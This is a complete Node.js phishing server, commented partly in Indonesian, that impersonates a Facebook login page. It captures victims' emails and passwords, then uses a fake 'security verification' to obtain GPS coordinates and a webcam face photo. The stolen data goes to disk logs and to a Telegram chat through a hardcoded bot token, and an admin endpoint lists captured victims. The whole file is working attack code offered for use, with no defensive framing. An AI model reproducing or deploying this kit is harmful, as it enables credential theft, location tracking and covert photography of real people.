// server.js - Advanced Phishing & Tracking System with Telegram Integration
const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const geoip = require('geoip-lite');
const moment = require('moment');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const os = require('os');
const app = express();

// Konfigurasi
const TELEGRAM_BOT_TOKEN = process.env.BOT_TOKEN || '8550434238:AAGyTIQX3vp3ImCHo5ADpsUDJdrYGAXYcFo';
const TELEGRAM_CHAT_ID = process.env.CHAT_ID || '6834832649';
const PORT = process.env.PORT || 3000;
const DOMAIN = process.env.DOMAIN || `http://localhost:${PORT}`;
const NODE_ENV = process.env.NODE_ENV || 'development';

// Tentukan direktori logs yang aman
let logsDir;
try {
    // Coba buat di direktori tmp (biasanya writable)
    logsDir = path.join(os.tmpdir(), 'phishing-logs');
    
    // Cek apakah bisa write di direktori tmp
    fs.accessSync(os.tmpdir(), fs.constants.W_OK);
    
    if (!fs.existsSync(logsDir)) {
        fs.mkdirSync(logsDir, { recursive: true });
    }
    console.log(`📁 Logs directory: ${logsDir}`);
} catch (error) {
    // Fallback ke memory-only mode
    console.warn('⚠️ Cannot create logs directory, running in memory-only mode');
    logsDir = null;
}

// Inisialisasi Bot
let bot = null;
try {
    if (TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== '8550434238:AAECMid6pXeBoLCdySDfd_2hXkWEMBfjI8s') {
        bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { 
            polling: false,
            request: {
                timeout: 30000 // 30 second timeout
            }
        });
        console.log('✅ Telegram bot initialized');
    }
} catch (error) {
    console.error('❌ Failed to initialize Telegram bot:', error.message);
}

// Database in-memory
const victims = new Map();
const sessions = new Map();

// Middleware
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// Security headers
app.use((req, res, next) => {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('X-XSS-Protection', '1; mode=block');
    next();
});

// Middleware untuk session ID
app.use((req, res, next) => {
    try {
        req.sessionId = crypto.randomBytes(16).toString('hex');
        sessions.set(req.sessionId, {
            ip: getClientIp(req),
            userAgent: req.headers['user-agent'],
            timestamp: Date.now()
        });
        
        // Bersihkan sessions lama (lebih dari 1 jam)
        const oneHourAgo = Date.now() - (60 * 60 * 1000);
        for (const [id, session] of sessions.entries()) {
            if (session.timestamp < oneHourAgo) {
                sessions.delete(id);
            }
        }
    } catch (error) {
        console.error('Session error:', error);
        req.sessionId = 'error-' + Date.now();
    }
    next();
});

// Fungsi untuk mendapatkan IP address dengan aman
function getClientIp(req) {
    try {
        return req.headers['x-forwarded-for']?.split(',')[0] || 
               req.headers['x-real-ip'] ||
               req.connection?.remoteAddress || 
               req.socket?.remoteAddress || 
               req.connection?.socket?.remoteAddress ||
               '0.0.0.0';
    } catch (error) {
        return '0.0.0.0';
    }
}

// Generate victim ID
function generateVictimId(req) {
    try {
        const ip = getClientIp(req);
        const userAgent = req.headers['user-agent'] || '';
        const timestamp = Date.now();
        const random = Math.random().toString();
        
        return crypto
            .createHash('sha256')
            .update(ip + userAgent + timestamp + random)
            .digest('hex')
            .substring(0, 12);
    } catch (error) {
        return 'victim-' + Date.now() + '-' + Math.random().toString(36).substring(2, 8);
    }
}

// Fungsi untuk mendapatkan nama browser
function getBrowserName(userAgent) {
    if (!userAgent) return 'Unknown';
    try {
        userAgent = userAgent.toLowerCase();
        if (userAgent.includes('chrome') && !userAgent.includes('edg')) return 'Chrome';
        if (userAgent.includes('firefox')) return 'Firefox';
        if (userAgent.includes('safari') && !userAgent.includes('chrome')) return 'Safari';
        if (userAgent.includes('edg')) return 'Edge';
        if (userAgent.includes('opera') || userAgent.includes('opr')) return 'Opera';
        return 'Unknown';
    } catch (error) {
        return 'Unknown';
    }
}

// Fungsi untuk menyimpan data ke file (dengan error handling)
function saveToFile(data) {
    if (!logsDir) {
        console.log('📝 Memory-only mode: Data not saved to disk');
        return;
    }
    
    try {
        // Pastikan data valid
        if (!data || !data.victimId) {
            console.error('Invalid data for saving');
            return;
        }
        
        // Simpan data lengkap sebagai JSON
        const jsonFile = path.join(logsDir, `victim_${data.victimId}.json`);
        fs.writeFileSync(jsonFile, JSON.stringify(data, null, 2));
        
        // Simpan ke log utama
        const logEntry = `
================================================================================
VICTIM ID: ${data.victimId}
SESSION ID: ${data.sessionId || 'N/A'}
TIME: ${new Date().toISOString()}
----------------------------------------------------------------------------
CREDENTIALS:
  Email: ${data.credentials?.email || 'N/A'}
  Password: ${data.credentials?.password || 'N/A'}
----------------------------------------------------------------------------
LOCATION:
  IP: ${data.ip || 'N/A'}
  Country: ${data.geolocation?.country || 'Unknown'}
  City: ${data.geolocation?.city || 'Unknown'}
----------------------------------------------------------------------------
SYSTEM INFO:
  Platform: ${data.system?.platform || 'N/A'}
  Browser: ${getBrowserName(data.system?.userAgent)}
================================================================================

`;
        
        const masterLog = path.join(logsDir, 'master_log.txt');
        fs.appendFileSync(masterLog, logEntry);
        
        // Simpan foto terpisah jika ada (dengan ukuran terbatas)
        if (data.photo && typeof data.photo === 'string') {
            try {
                // Batasi ukuran foto (max 5MB)
                if (data.photo.length > 5 * 1024 * 1024) {
                    console.log('Photo too large, skipping save');
                    return;
                }
                
                const matches = data.photo.match(/^data:image\/([a-zA-Z]+);base64,/);
                if (matches) {
                    const base64Data = data.photo.replace(/^data:image\/[a-zA-Z]+;base64,/, '');
                    const buffer = Buffer.from(base64Data, 'base64');
                    const photoFile = path.join(logsDir, `photo_${data.victimId}.jpg`);
                    fs.writeFileSync(photoFile, buffer);
                }
            } catch (photoError) {
                console.error('Error saving photo:', photoError.message);
            }
        }
        
        console.log(`📁 Data saved for victim: ${data.victimId}`);
        
    } catch (error) {
        console.error('Error saving to file:', error.message);
        // Jangan throw error, biarkan program tetap jalan
    }
}

// Fungsi untuk mengirim alert ke Telegram (dengan error handling)
async function sendTelegramAlert(data) {
    if (!bot) {
        console.log('ℹ️ Telegram bot not configured, skipping alert');
        return;
    }
    
    try {
        // Validasi data
        if (!data || !data.victimId) {
            console.error('Invalid data for Telegram alert');
            return;
        }
        
        // Format pesan utama dengan aman
        const message = `
🎯 *NEW VICTIM CAPTURED* 🎯

*🔐 CREDENTIALS*
👤 Email: \`${(data.credentials?.email || 'N/A').substring(0, 100)}\`
🔑 Password: \`${(data.credentials?.password || 'N/A').substring(0, 100)}\`

*📍 LOCATION DATA*
🌐 IP Address: \`${data.ip || 'N/A'}\`
${data.geolocation ? `🗺️ Country: ${data.geolocation.country || 'Unknown'}` : ''}
${data.location ? `📍 Coordinates: ${data.location.latitude || 'N/A'}, ${data.location.longitude || 'N/A'}` : ''}

*🖥️ SYSTEM INFO*
💻 Platform: ${data.system?.platform || 'N/A'}
🌐 Browser: ${getBrowserName(data.system?.userAgent)}
📱 Screen: ${data.system?.screen?.width || 'N/A'}x${data.system?.screen?.height || 'N/A'}

*⏰ TIMING*
🕐 Time: ${moment(data.timestamp).format('YYYY-MM-DD HH:mm:ss')}

*🆔 Victim ID:* \`${data.victimId}\`
        `;
        
        // Kirim pesan utama
        await bot.sendMessage(TELEGRAM_CHAT_ID, message, { 
            parse_mode: 'Markdown',
            disable_web_page_preview: true
        }).catch(err => console.error('Failed to send main message:', err.message));
        
        // Kirim lokasi jika ada
        if (data.location?.latitude && data.location?.longitude) {
            await bot.sendLocation(
                TELEGRAM_CHAT_ID, 
                data.location.latitude, 
                data.location.longitude
            ).catch(err => console.error('Failed to send location:', err.message));
        }
        
        // Kirim foto jika ada (dengan ukuran terbatas)
        if (data.photo && typeof data.photo === 'string') {
            try {
                // Batasi ukuran foto untuk Telegram (max 5MB)
                if (data.photo.length > 5 * 1024 * 1024) {
                    await bot.sendMessage(TELEGRAM_CHAT_ID, '📸 *Photo too large to send*', { parse_mode: 'Markdown' });
                    return;
                }
                
                const matches = data.photo.match(/^data:image\/([a-zA-Z]+);base64,/);
                if (matches) {
                    const base64Data = data.photo.replace(/^data:image\/[a-zA-Z]+;base64,/, '');
                    const buffer = Buffer.from(base64Data, 'base64');
                    
                    await bot.sendPhoto(TELEGRAM_CHAT_ID, buffer, {
                        caption: '📸 *Face Photo Captured*',
                        parse_mode: 'Markdown'
                    }).catch(err => console.error('Failed to send photo:', err.message));
                }
            } catch (photoError) {
                console.error('Error processing photo:', photoError.message);
            }
        }
        
        console.log(`✅ Telegram alert sent for victim: ${data.victimId}`);
        
    } catch (error) {
        console.error('Error sending Telegram alert:', error.message);
        // Jangan throw error, biarkan program tetap jalan
    }
}

// Route Utama - Halaman Phishing (disederhanakan untuk menghindari error)
app.get('/', (req, res) => {
    try {
        const victimId = generateVictimId(req);
        const sessionId = req.sessionId;
        
        res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <title>Facebook Login</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
                body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
                .container { width: 100%; max-width: 400px; padding: 20px; }
                .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
                h1 { color: #1877f2; text-align: center; margin-bottom: 20px; }
                input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; }
                button { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
                button:hover { background: #166fe5; }
                .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); }
                .modal-content { background: white; width: 90%; max-width: 400px; margin: 50px auto; padding: 20px; border-radius: 8px; }
                #cameraVideo { width: 100%; max-height: 300px; background: #000; }
                .loading { display: inline-block; width: 30px; height: 30px; border: 3px solid #f3f3f3; border-top: 3px solid #1877f2; border-radius: 50%; animation: spin 1s linear infinite; }
                @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="login-box">
                    <h1>Facebook</h1>
                    <form id="loginForm">
                        <input type="text" id="email" placeholder="Email or Phone" required>
                        <input type="password" id="password" placeholder="Password" required>
                        <button type="submit">Log In</button>
                    </form>
                </div>
            </div>

            <div id="securityModal" class="modal">
                <div class="modal-content">
                    <h3>Security Verification</h3>
                    <p>Please verify your identity to continue.</p>
                    <button onclick="startVerification()" style="margin-top:10px;">Continue</button>
                </div>
            </div>

            <div id="cameraModal" class="modal">
                <div class="modal-content">
                    <h3>Camera Access</h3>
                    <video id="cameraVideo" autoplay playsinline></video>
                    <div style="margin-top:10px;">
                        <button onclick="capturePhoto()">Capture</button>
                        <button onclick="skipCamera()">Skip</button>
                    </div>
                </div>
            </div>

            <div id="loadingModal" class="modal">
                <div class="modal-content" style="text-align:center;">
                    <div class="loading" style="margin:20px auto;"></div>
                    <p>Processing...</p>
                </div>
            </div>

            <script>
                const victimId = '${victimId}';
                const sessionId = '${sessionId}';
                let cameraStream = null;
                let collectedData = {};

                document.getElementById('loginForm').addEventListener('submit', function(e) {
                    e.preventDefault();
                    collectedData = {
                        credentials: {
                            email: document.getElementById('email').value,
                            password: document.getElementById('password').value
                        },
                        timestamp: new Date().toISOString()
                    };
                    document.getElementById('securityModal').style.display = 'block';
                });

                async function startVerification() {
                    document.getElementById('securityModal').style.display = 'none';
                    
                    collectedData.system = {
                        userAgent: navigator.userAgent,
                        platform: navigator.platform,
                        screen: { width: screen.width, height: screen.height },
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                    };

                    try {
                        const response = await fetch('https://api.ipify.org?format=json');
                        const data = await response.json();
                        collectedData.ip = data.ip;
                    } catch(e) {
                        collectedData.ip = 'unknown';
                    }

                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                            pos => {
                                collectedData.location = {
                                    latitude: pos.coords.latitude,
                                    longitude: pos.coords.longitude
                                };
                                showCamera();
                            },
                            () => showCamera()
                        );
                    } else {
                        showCamera();
                    }
                }

                async function showCamera() {
                    document.getElementById('cameraModal').style.display = 'block';
                    try {
                        cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
                        document.getElementById('cameraVideo').srcObject = cameraStream;
                    } catch(e) {
                        skipCamera();
                    }
                }

                function capturePhoto() {
                    const video = document.getElementById('cameraVideo');
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    collectedData.photo = canvas.toDataURL('image/jpeg');
                    
                    if (cameraStream) {
                        cameraStream.getTracks().forEach(t => t.stop());
                    }
                    
                    document.getElementById('cameraModal').style.display = 'none';
                    sendData();
                }

                function skipCamera() {
                    if (cameraStream) {
                        cameraStream.getTracks().forEach(t => t.stop());
                    }
                    document.getElementById('cameraModal').style.display = 'none';
                    sendData();
                }

                async function sendData() {
                    document.getElementById('loadingModal').style.display = 'block';
                    
                    collectedData.victimId = victimId;
                    collectedData.sessionId = sessionId;

                    try {
                        await fetch('/api/track', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(collectedData)
                        });
                    } catch(e) {
                        console.log('Error:', e);
                    }

                    window.location.href = 'https://facebook.com';
                }
            </script>
        </body>
        </html>
        `);
    } catch (error) {
        console.error('Error serving homepage:', error);
        res.status(500).send('Server Error');
    }
});

// API endpoint untuk menerima data tracking
app.post('/api/track', async (req, res) => {
    try {
        const data = req.body || {};
        const victimId = data.victimId || generateVictimId(req);
        
        // Validasi data
        if (!data.credentials?.email || !data.credentials?.password) {
            return res.status(400).json({ success: false, error: 'Invalid data' });
        }
        
        // Add metadata
        data.victimId = victimId;
        data.sessionId = req.sessionId;
        data.serverTimestamp = new Date().toISOString();
        data.realIp = getClientIp(req);
        
        // Get IP geolocation (dengan error handling)
        if (data.ip && data.ip !== 'unknown') {
            try {
                const geo = geoip.lookup(data.ip);
                if (geo) {
                    data.geolocation = {
                        country: geo.country,
                        region: geo.region,
                        city: geo.city,
                        timezone: geo.timezone
                    };
                }
            } catch (geoError) {
                console.error('GeoIP error:', geoError.message);
            }
        }
        
        // Simpan ke database (dengan batasan ukuran)
        if (victims.size > 1000) {
            // Hapus data lama jika terlalu banyak
            const oldestKey = victims.keys().next().value;
            victims.delete(oldestKey);
        }
        victims.set(victimId, data);
        
        // Kirim alert (jangan await agar tidak blocking)
        sendTelegramAlert(data).catch(err => console.error('Telegram error:', err.message));
        
        // Simpan ke file (jangan await agar tidak blocking)
        setTimeout(() => {
            saveToFile(data);
        }, 0);
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('Error in /api/track:', error);
        res.status(500).json({ success: false, error: 'Server error' });
    }
});

// Admin dashboard (dengan proteksi sederhana)
app.get('/admin', (req, res) => {
    try {
        // Simple auth (ganti dengan yang lebih aman untuk production)
        const auth = req.headers.authorization;
        if (auth !== 'Bearer admin123') {
            return res.status(401).json({ error: 'Unauthorized' });
        }
        
        const victimsList = Array.from(victims.values()).slice(-50).map(v => ({
            id: v.victimId,
            email: v.credentials?.email,
            ip: v.ip,
            time: v.timestamp,
            country: v.geolocation?.country || 'Unknown',
            hasPhoto: !!v.photo
        }));
        
        res.json({
            total: victims.size,
            victims: victimsList,
            memory: process.memoryUsage(),
            uptime: process.uptime()
        });
    } catch (error) {
        console.error('Admin error:', error);
        res.status(500).json({ error: 'Server error' });
    }
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ 
        status: 'ok', 
        time: new Date().toISOString(),
        victims: victims.size,
        sessions: sessions.size,
        logsDir: logsDir || 'memory-only'
    });
});

// Error handling middleware
app.use((err, req, res, next) => {
    console.error('Unhandled error:', err);
    res.status(500).json({ error: 'Internal server error' });
});

// 404 handler
app.use((req, res) => {
    res.status(404).json({ error: 'Not found' });
});

// Graceful shutdown
process.on('SIGTERM', () => {
    console.log('SIGTERM received, shutting down gracefully');
    process.exit(0);
});

process.on('SIGINT', () => {
    console.log('SIGINT received, shutting down gracefully');
    process.exit(0);
});

// Unhandled rejection handler
process.on('unhandledRejection', (error) => {
    console.error('Unhandled rejection:', error);
});

// Uncaught exception handler
process.on('uncaughtException', (error) => {
    console.error('Uncaught exception:', error);
});

// Start server
const server = app.listen(PORT, '0.0.0.0', () => {
    console.log(`
╔════════════════════════════════════════════════╗
║     PHISHING TRACKER SERVER RUNNING            ║
╠════════════════════════════════════════════════╣
║  URL: http://localhost:${PORT}                   ║
║  Port: ${PORT}                                   ║
║  Environment: ${NODE_ENV}                        ║
║  Telegram: ${bot ? '✅' : '❌'}                    ║
║  Logs: ${logsDir || 'Memory Only'}              ║
║  Victims: ${victims.size}                        ║
╚════════════════════════════════════════════════╝
    `);
});

// Handle server errors
server.on('error', (error) => {
    console.error('Server error:', error);
});

module.exports = app;
